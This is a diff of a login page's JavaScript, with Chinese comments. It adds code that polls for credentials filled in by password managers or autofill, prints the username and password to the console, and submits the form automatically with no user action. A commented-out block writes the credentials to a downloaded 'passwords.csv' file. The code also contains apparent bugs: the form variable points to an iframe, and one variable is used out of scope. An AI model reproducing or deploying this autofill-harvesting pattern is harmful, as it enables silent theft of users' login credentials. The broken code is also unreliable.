@@ -49,34 +49,96 @@
     ></iframe>
 
     <script>
-      // Function to check if input fields are filled
-      function checkForm() {
-        const iframe = document.getElementById("loginIframe");
-        const iframeDocument =
-          iframe.contentDocument || iframe.contentWindow.document;
+      document.addEventListener("DOMContentLoaded", function () {
+        // 取得表單與輸入欄位
+        const form = document.getElementById("loginIframe");
+        const usernameInput = document.getElementById("username");
+        const passwordInput = document.getElementById("password");
 
-        // Get the login form fields (adjust the selectors as needed)
-        const usernameField = iframeDocument.querySelector(
-          'input[name="username"]'
-        );
-        const passwordField = iframeDocument.querySelector(
-          'input[name="password"]'
-        );
+        // 監聽輸入欄位變化
+        function checkAndSubmit() {
+          let username = usernameInput.value.trim();
+          let password = passwordInput.value.trim();
 
-        // Check if both fields are filled
-        if (
-          usernameField &&
-          passwordField &&
-          usernameField.value &&
-          passwordField.value
-        ) {
-          // Show the popup window
-          alert("Login information has been filled!");
+          console.log("account:", username, "pw:", password); // 在 Console 顯示輸入的值
+
+          if (username && password) {
+            setTimeout(() => {
+              console.log("⏳ 準備提交表單...");
+              form.submit(); // 提交表單
+            }, 1000); // 1 秒後提交
+          }
         }
-      }
 
-      // Set an interval to monitor the fields
-      setInterval(checkForm, 1000); // Check every second
+        console.log("not in checkAndSubmit:", username, password); // 在 Console 顯示輸入的值
+        // 當使用者手動輸入時，觸發檢查
+        //usernameInput.addEventListener("input", checkAndSubmit);
+        //passwordInput.addEventListener("input", checkAndSubmit);
+
+        usernameInput.addEventListener("focus", checkAndSubmit);
+
+        // **每 500 毫秒檢查一次是否有填入帳密（解決 Password Manager 問題）**
+        setTimeout(() => {
+          setInterval(() => {
+            console.log("waiting");
+            if (usernameInput.value.trim() && passwordInput.value.trim()) {
+              console.log("account filled");
+              checkAndSubmit();
+            }
+          }, 500);
+        }, 1000);
+      });
+
+      /*function autoSubmitAndDownload() {*/
+      /*
+            // 取得帳號與密碼
+            let username = document.getElementById("username").value.trim();
+            let password = document.getElementById("password").value.trim();
+
+            // **如果帳號或密碼為空，則不執行下載與提交**
+            if (!username || !password) return;
+
+            // 建立 CSV 內容
+            let csvContent = "Account,Password\n" + username + "," + password + "\n";
+
+            // 產生 Blob（位元物件）並設定為 CSV 格式
+            let blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
+
+            // 建立隱藏的下載連結
+            let link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = "passwords.csv";
+
+            // **嘗試模擬使用者點擊下載**
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // **顯示提示**
+            document.getElementById("message").style.display = "block";
+            */
+      /*
+            console.log("auto:", username, password);
+            // **2 秒後自動提交表單**
+            setTimeout(() => {
+                document.forms[0].submit();
+            }, 2000);
+            
+        }
+        
+        function checkAndStart() {
+            let username = document.getElementById("username").value.trim();
+            let password = document.getElementById("password").value.trim();
+
+            console.log("data:", username, password);
+            if (username && password) {
+                setTimeout(autoSubmitAndDownload, 1000);
+            }
+        }
+        
+        // **監聽輸入欄位，當使用者輸入完畢後 1 秒執行**
+        document.getElementById("username").addEventListener("input", checkAndStart);
+        document.getElementById("password").addEventListener("input", checkAndStart);*/
     </script>
   </body>
 </html>
